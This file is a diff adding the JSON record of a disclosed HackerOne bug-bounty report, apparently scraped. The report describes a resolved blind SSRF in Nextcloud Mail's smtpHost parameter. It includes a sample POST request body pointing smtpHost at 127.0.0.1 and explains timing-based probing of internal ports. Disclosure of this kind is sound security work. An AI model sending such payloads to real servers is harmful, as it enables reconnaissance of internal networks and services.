@@ -1,0 +1,233 @@
+{
+  "id": 1746582,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzQ2NTgy",
+  "url": "https://hackerone.com/reports/1746582",
+  "title": "Mail app - blind SSRF via smtpHost parameter",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2022-10-22T11:43:18.302Z",
+  "submitted_at": "2022-10-22T11:43:18.407Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "supr4s",
+    "url": "/supr4s",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/cnms4l7faunf0sht0ox61ouwsqlj/f287f761e822d68f6d2a6fdde3cb8c84c04060fd04f19b5dab1fe20f75f44886"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2023-23943"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-02-06T21:28:29.483Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-02-06T21:28:29.370Z",
+  "team_member_agreed_on_going_public_at": "2023-02-06T09:48:19.099Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi everyone,\n\nI would like to report here a Blind SSRF vulnerability through the Nextcloud Mail application.\n\nTested on latest Mail release : `2.0.1`.\n\n## Steps To Reproduce:\n\nThis is a similar report to report #1736390, but this time on a different parameter. The vulnerable parameter is `smtpHost`.\n\nThe only difference here is that you have to enter the correct settings for the IMAP part first. The server will first check if the IMAP parameters are correct, before checking the SMTP parameters and thus allowing us to use this SSRF blind.\n\nThe POST request in question : \n\n```\n{\"imapHost\":\"ssl0.ovh.net\",\"imapPort\":993,\"imapSslMode\":\"ssl\",\"imapUser\":\"redacted\",\"imapPassword\":\"redacter\",\"smtpHost\":\"127.0.0.1\",\"smtpPort\":8080,\"smtpSslMode\":\"none\",\"smtpUser\":\"xx\",\"smtpPassword\":\"xx\",\"accountName\":\"Test1\",\"emailAddress\":\"xxx@xxx.org\"}\n```\n\nThis does not change afterwards, we can probe accessible IPs/open ports based on the response time : \n\n- For an accessible host/port: response time > 1000ms \n- For a closed port/host that does not exist: response time < 100ms\n\n{{F1998975}}\n\n```\nPort 80 - response time : 5200ms - Apache2 service\nPort 443 - response time : 5200ms - Apache2 service\nPort 8080 - response time 5140ms - CrowdSec\nPort 6060 - response time 5180ms - CrowdSec\nPort 5432 - response time 5191ms -  PostgreSQL\nPort 6379 - response time 5216ms - My Redis instance for Nextcloud\n```\n\n## Impact\n\nFrom [OWASP](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/) :\n\n> SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL).\n\nThis vulnerability can be exploited by any user, regardless of their rights, as long as the mail application is installed and enabled. A malicious person can therefore retrieve the services running locally on the server, scan your internal network for interesting information about which IPs are responding, which services are running on each IP address, etc.\n\nRegards,\nSupr4s",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1998975,
+      "file_name": "Capture_d__cran_du_2022-10-15_22-53-34.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/cv4mw5p8qz4awtdtivo7q5pz36qi?response-content-disposition=attachment%3B%20filename%3D%22Capture_d__cran_du_2022-10-15_22-53-34.png%22%3B%20filename%2A%3DUTF-8%27%27Capture_d__cran_du_2022-10-15_22-53-34.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3N7EBZNJ%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T045926Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDwaCXVzLXdlc3QtMiJIMEYCIQCN33Wu%2B48MEawxr1qSYjRINdCZrIxvoI16%2FhNj9IE13QIhAMQFdDC3MYgAohc8ldkqsBCUSI7o4LspW7K5t6XaBP5BKrIFCAUQAxoMMDEzNjE5Mjc0ODQ5Igwa%2F1k8BqO2P%2BY0X1MqjwW%2B7PJ%2FMXKMWwbEnpnhc8Bc66zOsocfFESuUt0FbjeUaltS88%2Fi3ZRIyCzL66MvuIw5vhX4pmxcP2k%2B8wbdqsGXFM6ynJuJ57U7yS95P0BeyLcq%2FIQ9xtD6fXPT44SCjxc%2B05HzLTieEr5kW9ay0c2s6r98ThCUc6TsNZG0geI3QSzoggzqnHo%2B8jCUcCew9si75N13ooFXnamCoc%2FV4phlXJ3QXlqbhZR%2FVWkGAiCTOkxjRGBGnpnSFbPEazZ3cC%2F6%2FItNW%2F7Sa1qrnpTq3xe7ctV4h2rA2GJPvmeFr%2BKd%2FS55IL8ehdC8gT%2FkhXCBgimPCaECRGi8wpsGcLnVZKIzE5de90vou6qpQ8etnO8Pm71XL%2B0AkgxnfkGawlddQ2bQfwPv6LsIDlhQ5x0Ce8bGs6FGZ7yo9EP9KBjo%2B%2FYycuBTdJpX56BlzzwdJ2Y7ZhtITvjp9jvKAjAVYW3PgjPsVL5sNcy%2BeAI3aH%2BWqPd6raypyUdycxVQ7vyJ8YDjp2EBhI1nrMJQcd3n8xk9cRw03QV1V3aMMDUX6g0zaJ3aNMmCTJyPmBDZQuHseNUCtgagwV4m3z7p03LeDJ85KPKaxRxWS5VKUgY2eCowfKXZvh%2F%2Bn1ko38oODnQNKErRLhLRDueoh0NsMdqhFRM2BeTZ4SvRSjbXFcrdwxfX0TsxzSGWf%2BJL20J9zDZUGDPl2lM9eKUCNqDy4vYQoxxNKXXyZKyyWbjtUVp9vLKz89bofeS6qHnO%2FpAy%2BnqMR4YO0aZSSsje4KNNAmrlUQ%2FHBsTtquusFiC0v8YupENOveNwAX82NzwfT6ckL0SRgZvRxka840ibrkbTQ%2BujefLD2YIak5cqNA0fiUKnGeTuhULiMMHpnNIGOrABEbD67DV0K%2F%2BXKgTb8UCLnlqG3WZ8Vl0R0iUP6m4yCOXsGww3vfc1RCJMa7gOssaA54lDNoljsMVDL%2BGGfQZgqTJaa%2BZqvMWeVVRHXKjf2loVtiFvOJYL7XP4hLrUL9Ff36ZhYGqtb4HH6m2UX%2FBFchtrqORuQ0xSn%2BCH2JPUbM5wOxqKegwXCvv3xijbUnonqGpl5AdgDXnF75b0fd6qf8E4Gcmy8eVAhuXlKvCHxgg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6380e12acbe8d3e4957b27d1fb1b28cf7b5ab8de6f897e08caf1adbf1d38c4d7",
+      "file_size": 58812,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2023-03-08T09:48:19.212Z",
+  "allow_singular_disclosure_after": -104785866.92886007,
+  "singular_disclosure_allowed": true,
+  "vote_count": 10,
+  "voters": [
+    "defenderwww",
+    "zy9ard3",
+    "shreyaschavhan",
+    "shubham_srt",
+    "rvats",
+    "unknown1122w",
+    "destinedtohack",
+    "qweasdzxcvbn",
+    "mutsuraev01",
+    "sandip05"
+  ],
+  "severity": {
+    "rating": "low",
+    "score": 3.5,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 45132,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "nextcloud/mail",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 248860,
+      "category": "team",
+      "content": "Security advisory at https://github.com/nextcloud/security-advisories/security/advisories/GHSA-8gcx-r739-9pf6",
+      "updated_at": "2023-02-02T08:00:10.741Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 89223,
+        "username": "nickvergessen",
+        "name": "Joas Schilling",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "Germany",
+        "created_at": "2016-07-01T08:17:59.061Z",
+        "url": "https://hackerone.com/nickvergessen",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/f0e07660005686ec92c43da54c0094c1ac1b490ea8c5eac04a4081d912d6ce36"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "1746582",
+  "votes": 10,
+  "latest_disclosable_activity_at": "2023-02-06T21:28:29.579Z",
+  "_metadata": {
+    "saved_at": "2026-07-03T12:59:26.261987",
+    "source": "https://hackerone.com/reports/1746582.json",
+    "report_id": 1746582
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzQ2NTgy",
+    "databaseId": "1746582",
+    "title": "Mail app - blind SSRF via smtpHost parameter",
+    "url": "https://hackerone.com/reports/1746582",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2023-02-06T21:28:29.483Z",
+    "created_at": "2022-10-22T11:43:18.302Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzY4",
+      "name": "Server-Side Request Forgery (SSRF)",
+      "external_id": "cwe-918"
+    },
+    "severity": {
+      "rating": "low",
+      "score": 3.5
+    },
+    "reporter": {
+      "username": "supr4s"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzEzMjkx",
+      "handle": "nextcloud",
+      "name": "Nextcloud",
+      "url": "https://hackerone.com/nextcloud",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzE3NDY1ODI=",
+    "_id": "1746582",
+    "disclosed": true,
+    "votes": 10,
+    "latest_disclosable_activity_at": "2023-02-06T21:28:29.579Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzQ2NTgy",
+      "databaseId": "1746582",
+      "title": "Mail app - blind SSRF via smtpHost parameter",
+      "url": "https://hackerone.com/reports/1746582",
+      "disclosed_at": "2023-02-06T21:28:29.483Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzEzMjkx",
+      "handle": "nextcloud",
+      "name": "Nextcloud",
+      "url": "https://hackerone.com/nextcloud",
+      "currency": "usd"
+    }
+  }
+}
